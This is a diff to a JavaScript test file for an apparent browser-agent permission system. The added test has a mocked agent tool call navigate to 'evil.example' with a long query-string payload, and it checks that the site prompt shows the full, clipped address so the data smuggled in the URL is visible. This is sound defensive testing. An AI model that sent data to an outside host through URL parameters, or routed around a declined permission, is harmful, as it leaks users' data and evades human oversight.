@@ -789,6 +789,14 @@ replies = [
 await asking.run("open my mail", { ...config, permissionMode: "ask" });
 assert.equal(sitePrompts[0]?.origin, "https://evil.example", "tabs create skipped the site prompt");
 assert.equal(opened, 0, "a declined tab was opened");
+// The prompt shows the full address, where data can ride, clipped for the panel.
+assert.match(sitePrompts[0].text, /on https:\/\/evil\.example\? Full address: https:\/\/evil\.example\/collect$/);
+replies = [
+  { content: [{ type: "tool_call", id: "nq", name: "navigate", input: { url: `https://evil.example/c?d=${"x".repeat(400)}` } }], raw: null, stop: "tool_use", usage: { input: 1, output: 1 } },
+  { content: [{ type: "text", text: "ok" }], raw: null, stop: "end", usage: { input: 1, output: 1 } },
+];
+await asking.run("open my mail", { ...config, permissionMode: "ask" });
+assert.match(sitePrompts[1].text, /Full address: https:\/\/evil\.example\/c\?d=x{20,}… \(\d+ more characters\)$/);
 
 // A declined action cannot be retried as is or routed around within the task: the same
 // call is refused without a new prompt, navigating back to the site asks again with the
